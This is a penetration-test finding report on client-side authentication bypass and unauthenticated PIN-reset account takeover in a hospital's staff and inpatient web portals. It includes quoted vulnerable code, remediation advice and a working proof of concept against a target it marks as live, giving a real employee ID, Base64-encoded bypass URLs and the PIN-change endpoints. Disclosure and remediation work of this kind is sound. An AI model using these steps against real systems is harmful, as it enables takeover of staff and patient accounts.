# WEB-2026-001 — Complete Client-Side Authentication Bypass & Unauthenticated Account Takeover (PIN Reset) on Staff (`/Nnote/`) and Inpatient (`/ncare/`) Portals

| Field | Value |
|---|---|
| **Finding ID** | WEB-2026-001 |
| **Severity** | **Critical** |
| **CVSS v3.1 Score** | **9.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **CWE** | CWE-287 (Improper Authentication), CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-620 (Unverified Password Change) |
| **OWASP Top 10 (2021)** | A07:2021 — Identification and Authentication Failures / A01:2021 — Broken Access Control |
| **Affected Targets** | `https://narayanagroup.co.in/Nnote/*`, `https://narayanagroup.co.in/ncare/*`, `https://narayanagroup.co.in/NnoteApi/api/*`, `https://narayanagroup.co.in/NtraktApi/api/*` |
| **Status** | Confirmed (Live Target) |

---

## 1. Summary

Both the **Narayana Staff / Clinical Notes Portal (`/Nnote/`)** and the **Inpatient Care Portal (`/ncare/`)** rely exclusively on client-side JavaScript redirects using Base64-encoded URL query parameters (`?empid=` and `?regno=`) without issuing or validating any server-side session cookie, JWT, or bearer token. Any unauthenticated attacker can bypass the login page completely by navigating directly to `layout.html` with a Base64-encoded Employee ID or Patient Registration Number.

Furthermore, the **Inpatient PIN Change endpoint (`POST /NnoteApi/api/Patient/ChangePin`)** and **Employee PIN Reset / Creation endpoints (`POST /NtraktApi/api/User/UpdatePin` and `POST /NnoteApi/api/Nnote/User/CreateUser`)** accept a new PIN directly from unauthenticated callers without verifying the existing PIN, an OTP state token, or an active session — enabling **zero-click account takeover** of any staff or inpatient account.

---

## 2. Technical Evidence (Live Capture)

### 2.1 Client-Side Authentication Bypass in `/Nnote/index.html` and `/Nnote/layout.html`

In `https://narayanagroup.co.in/Nnote/index.html`, upon PIN validation, no session token is created. Instead, the browser simply Base64-encodes the `empid` using `btoa()` and redirects to `layout.html`:

```javascript
// Source: https://narayanagroup.co.in/Nnote/index.html
$.post(apiURL + 'CheckPin', userData, function (response) {
    if (response.data == 'Fail') {
        alert('Invalid Employee Id/PIN. Please check.')
    } else {
        var result = response.data;
        var rresult1 = result.split("-");
        window.location.href = 'layout.html?empid=' + btoa($("#empid").val())
            + "&title=" + btoa(rresult1[0]) + "&campus=" + btoa(rresult1[1]);
    }
});
```

In `https://narayanagroup.co.in/Nnote/layout.html`, the dashboard reads `?empid=` from the URL query string via `atob(qsParm["empid"])` and loads all internal views (`profile.html`, `services.html`, `notifications.html`, `request.html`, `markattendance.html`, `AssetTrans.html`, `morenew.html`):

```javascript
// Source: https://narayanagroup.co.in/Nnote/layout.html
function qs() {
    var query = window.location.search.substring(1);
    ...
    $("#hempid").val(atob(qsParm["empid"]));
}
```

### 2.2 Client-Side Authentication Bypass in `/ncare/index.html` and `/ncare/layout.html`

Identically, the Inpatient Care Portal (`https://narayanagroup.co.in/ncare/index.html`) redirects to `layout.html?regno=<base64>`:

```javascript
// Source: https://narayanagroup.co.in/ncare/index.html
$.post(apiURL + 'Patient/Validate', patData, function (response) {
    if (response.data == 'Success')
        setTimeout(function () {
            window.location.href = 'layout.html?regno=' + btoa($("#regno").val());
        }, 3000);
});
```

### 2.3 Unauthenticated Inpatient Account Takeover via `/ncare/changepin.html`

In `https://narayanagroup.co.in/ncare/changepin.html`, clicking **Change** calls `POST /NnoteApi/api/Patient/ChangePin` with only `Regno`, `PIN`, and `ConfirmPIN` — **no current PIN, no OTP, and no session token are requested or verified**:

```javascript
// Source: https://narayanagroup.co.in/ncare/changepin.html
$('#change').click(function () {
    $.get(apiURL + 'Patient/IsInPatient/' + $("#regno").val(), function (response) {
        patData.Regno = $("#regno").val();
        patData.PIN = $("#pin").val();
        patData.ConfirmPIN = $("#cnfpin").val();
        ...
        $.post(apiURL + 'Patient/ChangePin', patData, function (response) {
            setTimeout(function () {
                window.location.href = 'index.html';
            });
        }, 'json');
    });
});
```

### 2.4 Unauthenticated Staff PIN Overwrite via `/Nnote/resetpin.html` and `/Nnote/registration.html`

In `https://narayanagroup.co.in/Nnote/resetpin.html`, the OTP verification step is enforced only in client-side JavaScript UI flow. The backend endpoint `POST /NtraktApi/api/User/UpdatePin` accepts `{ OperatorCode: empid, UniqueId: pin }` directly without an OTP verification token:

```javascript
// Source: https://narayanagroup.co.in/Nnote/resetpin.html
userData.OperatorCode = empid;
userData.UniqueId = $("#pin").val();
$.post(apiURL + 'User/UpdatePin', userData, function(response) {
    window.location.href = 'index.html';
});
```

Similarly, `https://narayanagroup.co.in/Nnote/registration.html` posts `{ Userid: empid, Password: $("#pin").val() }` directly to `POST /NnoteApi/api/Nnote/User/CreateUser`.

---

## 3. Proof of Concept (Non-Destructive)

1. Obtain a valid Employee ID (`3334024`) from the unauthenticated `/NnoteApi/Api/Nnote/Assignee/1` endpoint.
2. Base64-encode `3334024` → `MzMzNDAyNA==`.
3. Open the authenticated staff dashboard or profile page directly without logging in:
   ```
   https://narayanagroup.co.in/Nnote/layout.html?empid=MzMzNDAyNA==&title=SU5DSEFSR0U=&campus=TkVMTE9SRQ==
   https://narayanagroup.co.in/Nnote/profile.html?empid=MzMzNDAyNA==
   ```
4. The application loads the authenticated employee session, profile, attendance, and service request screens with zero credentials.

---

## 4. Business & Clinical Impact

- **Full Account Takeover of Hospital Staff & Inpatients:** Any attacker can take over any employee or inpatient account, reset their PIN, view or submit hospital service requests, mark fraudulent attendance, or impersonate hospital staff.
- **Unauthorized Access to Clinical & Administrative Functions:** Complete bypass of login controls across both mobile/web portals.

---

## 5. Remediation

1. **Implement Server-Side Session / Token Authentication:** Issue cryptographically signed, short-lived server-side sessions (`HttpOnly`, `Secure`, `SameSite=Strict` cookies or signed JWTs) upon successful authentication in `CheckPin` / `Patient/Validate`.
2. **Enforce Authorization on Every API Endpoint:** Require valid authentication tokens on all `/NtraktApi/api/*` and `/NnoteApi/api/*` endpoints and bind the authenticated user identity server-side rather than trusting `?empid=` or `?regno=` URL parameters.
3. **Require Current PIN or Server-Enforced Single-Use OTP Token for PIN Changes:**
   - In `/NnoteApi/api/Patient/ChangePin`, require and verify either the existing PIN or a time-bound, server-validated OTP token.
   - In `/NtraktApi/api/User/UpdatePin` and `/NnoteApi/api/Nnote/User/CreateUser`, require a server-issued cryptographic token generated only after `User/VerifyOTP` succeeds.
